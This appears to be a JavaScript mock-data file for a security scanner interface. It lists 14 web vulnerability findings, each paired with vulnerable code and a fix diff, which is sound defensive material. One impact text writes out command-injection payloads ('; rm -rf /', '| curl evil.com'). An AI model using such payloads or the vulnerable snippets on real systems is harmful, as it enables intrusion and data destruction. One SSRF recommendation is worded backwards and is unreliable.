import findings from './findings.json';

export const mockScanResponse = {
  scan_id: "scn_a1b2c3",
  repo_url: "https://github.com/org/demo-repo",
  files_scanned: 127,
  duration_ms: 840,
  summary: {
    critical: 3,
    high: 5,
    medium: 4,
    low: 2,
    total: 14
  },
  findings: findings
};

export const mockExplains = {
  "f_001": {
    finding_id: "f_001",
    explanation: "User input is concatenated directly into the SQL query.",
    impact: "An attacker could read, modify, or delete database data.",
    recommendation: "Use a parameterized query."
  },
  "f_002": {
    finding_id: "f_002",
    explanation: "Unsanitized user input from `req.body.file` is passed directly into a shell execution context via `child_process.exec`.",
    impact: "An adversary can append shell metacharacters (e.g. `; rm -rf /` or `| curl evil.com`) to gain arbitrary command execution on the host server.",
    recommendation: "Avoid shell command execution; use safer alternatives like `child_process.execFile` with an argument array or dedicated native libraries."
  },
  "f_003": {
    finding_id: "f_003",
    explanation: "The secret signing key for JWT token issuance is hardcoded directly in source code.",
    impact: "Anyone with read access to the repository or decompiled bundle can forge arbitrary tokens and impersonate any user or admin.",
    recommendation: "Store the signing key in an external secret manager or environment variable (e.g., `process.env.JWT_SECRET`)."
  },
  "f_004": {
    finding_id: "f_004",
    explanation: "The server initiates an HTTP request to a user-supplied URL without verifying the destination host or protocol.",
    impact: "Attackers can probe internal private networks, cloud metadata services (e.g., 169.254.169.254), or access unauthenticated internal APIs.",
    recommendation: "Validate target URLs against an explicit allowlist and restrict requests to private IP CIDR blocks."
  },
  "f_005": {
    finding_id: "f_005",
    explanation: "The file download route concatenates user-supplied filename into path.join without neutralizing directory traversal sequences (`../`).",
    impact: "Attackers can read sensitive files outside the public folder, such as `/etc/passwd` or `.env` credential files.",
    recommendation: "Sanitize filenames using `path.basename()` or verify that the resolved path starts with the intended directory root."
  },
  "f_006": {
    finding_id: "f_006",
    explanation: "The endpoint fetches an invoice by its ID directly without validating that the authenticated user owns or has permission to view that invoice.",
    impact: "Any authenticated user can view sensitive billing records, customer identities, and invoices of other organizations by iterating IDs.",
    recommendation: "Filter database queries by both `invoiceId` and `req.user.organizationId`."
  },
  "f_007": {
    finding_id: "f_007",
    explanation: "User-controlled bio string is inserted into the DOM without sanitization using `dangerouslySetInnerHTML`.",
    impact: "Allows Cross-Site Scripting (XSS) execution in victim browsers, leading to session hijacking, credential theft, and unauthorized actions.",
    recommendation: "Render bio as plain text children or sanitize with DOMPurify before rendering."
  },
  "f_008": {
    finding_id: "f_008",
    explanation: "Object keys such as `__proto__`, `constructor`, or `prototype` are copied recursively without restriction into the target object.",
    impact: "Attackers can pollute base Object prototypes, causing application crashes, authorization bypass, or remote code execution.",
    recommendation: "Validate keys to block `__proto__` and `constructor` or freeze the prototype chain."
  },
  "f_009": {
    finding_id: "f_009",
    explanation: "CORS policy sets `Access-Control-Allow-Origin: *` while simultaneously allowing user credentials.",
    impact: "Permits malicious third-party websites to execute authenticated requests against your API on behalf of visiting users.",
    recommendation: "Restrict the allowed origins to trusted domains and disable wildcard matching when credentials are enabled."
  },
  "f_010": {
    finding_id: "f_010",
    explanation: "The authentication endpoint does not enforce rate limiting or request throttling.",
    impact: "Permits high-volume credential stuffing, automated password guessing, and denial of service attacks.",
    recommendation: "Attach rate-limiting middleware (such as `express-rate-limit`) keyed on IP address and username."
  },
  "f_011": {
    finding_id: "f_011",
    explanation: "Password hashing relies on MD5, which is computationally weak, lacks salt, and is vulnerable to precomputed rainbow table attacks.",
    impact: "Leaked database hashes can be cracked almost instantaneously using modern GPUs.",
    recommendation: "Upgrade password hashing to Argon2id or bcrypt with high work factors."
  },
  "f_012": {
    finding_id: "f_012",
    explanation: "Security headers such as `Content-Security-Policy` and `X-Frame-Options` are absent from HTTP responses.",
    impact: "Leaves users vulnerable to clickjacking attacks, framing in malicious contexts, and unconstrained script execution.",
    recommendation: "Apply helmet middleware with strict CSP directives and frame protection."
  },
  "f_013": {
    finding_id: "f_013",
    explanation: "Session cookie lacks `HttpOnly` flag and `SameSite` attribute.",
    impact: "Client-side scripts can read the session token, amplifying XSS risks and making the application vulnerable to CSRF.",
    recommendation: "Set `httpOnly: true`, `secure: true`, and `sameSite: 'strict'` or `'lax'` on all session cookies."
  },
  "f_014": {
    finding_id: "f_014",
    explanation: "Detailed runtime error messages and stack traces are serialized and returned to API clients.",
    impact: "Exposes internal file paths, framework versions, database schema names, and library vulnerabilities to attackers.",
    recommendation: "Log stack traces internally on the server and return a generic error message in production."
  }
};

export const mockFixes = {
  "f_001": {
    finding_id: "f_001",
    file_path: "api/users.js",
    original_code: "db.query(\"SELECT * FROM users WHERE id=\" + id)",
    fixed_code: "db.query(\"SELECT * FROM users WHERE id = ?\", [id])",
    diff: "--- a/api/users.js\n+++ b/api/users.js\n@@ -42,1 +42,1 @@\n- db.query(\"SELECT * FROM users WHERE id=\" + id)\n+ db.query(\"SELECT * FROM users WHERE id = ?\", [id])",
    explanation_of_change: "Replaced string concatenation with a bound parameter."
  },
  "f_002": {
    finding_id: "f_002",
    file_path: "server/routes/preview.js",
    original_code: "exec(`convert ${req.body.file} output.png`, callback);",
    fixed_code: "execFile('convert', [path.basename(req.body.file), 'output.png'], callback);",
    diff: "--- a/server/routes/preview.js\n+++ b/server/routes/preview.js\n@@ -87,1 +87,1 @@\n- exec(`convert ${req.body.file} output.png`, callback);\n+ execFile('convert', [path.basename(req.body.file), 'output.png'], callback);",
    explanation_of_change: "Switched from shell-invoking exec to execFile with sanitized argument array."
  },
  "f_003": {
    finding_id: "f_003",
    file_path: "middleware/auth.js",
    original_code: "const token = jwt.sign(payload, \"super-secret-key-12345\");",
    fixed_code: "const token = jwt.sign(payload, process.env.JWT_SECRET);",
    diff: "--- a/middleware/auth.js\n+++ b/middleware/auth.js\n@@ -14,1 +14,1 @@\n- const token = jwt.sign(payload, \"super-secret-key-12345\");\n+ const token = jwt.sign(payload, process.env.JWT_SECRET);",
    explanation_of_change: "Replaced plaintext credential with secure environment variable configuration."
  },
  "f_004": {
    finding_id: "f_004",
    file_path: "services/webhookService.js",
    original_code: "const response = await fetch(req.body.targetUrl);",
    fixed_code: "if (!isAllowedUrl(req.body.targetUrl)) throw new Error('Untrusted target');\n  const response = await fetch(req.body.targetUrl);",
    diff: "--- a/services/webhookService.js\n+++ b/services/webhookService.js\n@@ -52,1 +52,2 @@\n- const response = await fetch(req.body.targetUrl);\n+ if (!isAllowedUrl(req.body.targetUrl)) throw new Error('Untrusted target');\n+ const response = await fetch(req.body.targetUrl);",
    explanation_of_change: "Added target URL validation and private CIDR blocking before outbound fetch."
  },
  "f_005": {
    finding_id: "f_005",
    file_path: "routes/fileDownload.js",
    original_code: "const filePath = path.join(__dirname, 'public', req.query.filename);",
    fixed_code: "const safeName = path.basename(req.query.filename);\n  const filePath = path.join(__dirname, 'public', safeName);",
    diff: "--- a/routes/fileDownload.js\n+++ b/routes/fileDownload.js\n@@ -33,1 +33,2 @@\n- const filePath = path.join(__dirname, 'public', req.query.filename);\n+ const safeName = path.basename(req.query.filename);\n+ const filePath = path.join(__dirname, 'public', safeName);",
    explanation_of_change: "Sanitized path with path.basename to strip path traversal tokens."
  },
  "f_006": {
    finding_id: "f_006",
    file_path: "controllers/invoiceController.js",
    original_code: "const invoice = await Invoice.findById(req.params.invoiceId);",
    fixed_code: "const invoice = await Invoice.findOne({ _id: req.params.invoiceId, orgId: req.user.orgId });",
    diff: "--- a/controllers/invoiceController.js\n+++ b/controllers/invoiceController.js\n@@ -78,1 +78,1 @@\n- const invoice = await Invoice.findById(req.params.invoiceId);\n+ const invoice = await Invoice.findOne({ _id: req.params.invoiceId, orgId: req.user.orgId });",
    explanation_of_change: "Enforced tenant isolation check against authenticated user credentials."
  },
  "f_007": {
    finding_id: "f_007",
    file_path: "client/src/components/UserProfile.jsx",
    original_code: "<div dangerouslySetInnerHTML={{ __html: user.bio }} />",
    fixed_code: "<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }} />",
    diff: "--- a/client/src/components/UserProfile.jsx\n+++ b/client/src/components/UserProfile.jsx\n@@ -56,1 +56,1 @@\n- <div dangerouslySetInnerHTML={{ __html: user.bio }} />\n+ <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }} />",
    explanation_of_change: "Sanitized HTML input through DOMPurify before inserting into the DOM."
  },
  "f_008": {
    finding_id: "f_008",
    file_path: "utils/deepMerge.js",
    original_code: "target[key] = source[key];",
    fixed_code: "if (['__proto__', 'constructor', 'prototype'].includes(key)) continue;\n    target[key] = source[key];",
    diff: "--- a/utils/deepMerge.js\n+++ b/utils/deepMerge.js\n@@ -28,1 +28,2 @@\n- target[key] = source[key];\n+ if (['__proto__', 'constructor', 'prototype'].includes(key)) continue;\n+ target[key] = source[key];",
    explanation_of_change: "Blocked dangerous prototype keys during deep recursive merge."
  },
  "f_009": {
    finding_id: "f_009",
    file_path: "server/app.js",
    original_code: "app.use(cors({ origin: '*', credentials: true }));",
    fixed_code: "app.use(cors({ origin: process.env.ALLOWED_ORIGINS?.split(',') || 'https://app.example.com', credentials: true }));",
    diff: "--- a/server/app.js\n+++ b/server/app.js\n@@ -24,1 +24,1 @@\n- app.use(cors({ origin: '*', credentials: true }));\n+ app.use(cors({ origin: process.env.ALLOWED_ORIGINS?.split(',') || 'https://app.example.com', credentials: true }));",
    explanation_of_change: "Replaced wildcard origin with explicit verified domain allowlist."
  },
  "f_010": {
    finding_id: "f_010",
    file_path: "routes/auth.js",
    original_code: "router.post('/login', async (req, res) => {",
    fixed_code: "const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });\nrouter.post('/login', authLimiter, async (req, res) => {",
    diff: "--- a/routes/auth.js\n+++ b/routes/auth.js\n@@ -31,1 +31,2 @@\n- router.post('/login', async (req, res) => {\n+ const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 });\n+ router.post('/login', authLimiter, async (req, res) => {",
    explanation_of_change: "Attached IP and window rate limiter to mitigate credential stuffing attacks."
  },
  "f_011": {
    finding_id: "f_011",
    file_path: "utils/hasher.js",
    original_code: "return crypto.createHash('md5').update(password).digest('hex');",
    fixed_code: "return await argon2.hash(password, { type: argon2.argon2id });",
    diff: "--- a/utils/hasher.js\n+++ b/utils/hasher.js\n@@ -12,1 +12,1 @@\n- return crypto.createHash('md5').update(password).digest('hex');\n+ return await argon2.hash(password, { type: argon2.argon2id });",
    explanation_of_change: "Migrated weak MD5 hashing algorithm to modern Argon2id with memory hardness."
  },
  "f_012": {
    finding_id: "f_012",
    file_path: "middleware/security.js",
    original_code: "res.setHeader('X-Powered-By', 'Express');",
    fixed_code: "res.setHeader('Content-Security-Policy', \"default-src 'self'\");\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.removeHeader('X-Powered-By');",
    diff: "--- a/middleware/security.js\n+++ b/middleware/security.js\n@@ -18,1 +18,3 @@\n- res.setHeader('X-Powered-By', 'Express');\n+ res.setHeader('Content-Security-Policy', \"default-src 'self'\");\n+ res.setHeader('X-Frame-Options', 'DENY');\n+ res.removeHeader('X-Powered-By');",
    explanation_of_change: "Enforced CSP and X-Frame-Options headers and removed fingerprinted technology banner."
  },
  "f_013": {
    finding_id: "f_013",
    file_path: "routes/session.js",
    original_code: "res.cookie('session_id', sid, { httpOnly: false });",
    fixed_code: "res.cookie('session_id', sid, { httpOnly: true, secure: true, sameSite: 'strict' });",
    diff: "--- a/routes/session.js\n+++ b/routes/session.js\n@@ -22,1 +22,1 @@\n- res.cookie('session_id', sid, { httpOnly: false });\n+ res.cookie('session_id', sid, { httpOnly: true, secure: true, sameSite: 'strict' });",
    explanation_of_change: "Set HttpOnly, Secure, and SameSite=strict on session cookie."
  },
  "f_014": {
    finding_id: "f_014",
    file_path: "server/errorHandler.js",
    original_code: "res.status(500).json({ error: err.message, stack: err.stack });",
    fixed_code: "logger.error(err);\n  res.status(500).json({ error: 'Internal server error' });",
    diff: "--- a/server/errorHandler.js\n+++ b/server/errorHandler.js\n@@ -88,1 +88,2 @@\n- res.status(500).json({ error: err.message, stack: err.stack });\n+ logger.error(err);\n+ res.status(500).json({ error: 'Internal server error' });",
    explanation_of_change: "Suppressed stack trace in client responses and redirected trace to internal server logger."
  }
};

export function getMockPullRequest(findingId, repoUrl = "https://github.com/org/demo-repo") {
  const shortId = (findingId || 'f001').replace('_', '');
  const randSha = Math.random().toString(16).substring(2, 9);
  const prNum = Math.floor(Math.random() * 20) + 1;
  const cleanRepo = repoUrl.replace(/\/+$/, '');

  return {
    branch: `patch/fix-${shortId}-${Math.floor(1000 + Math.random() * 9000)}`,
    commit_sha: randSha,
    pr_number: prNum,
    pr_url: `${cleanRepo}/pull/${prNum}`,
    files_changed: 1
  };
}
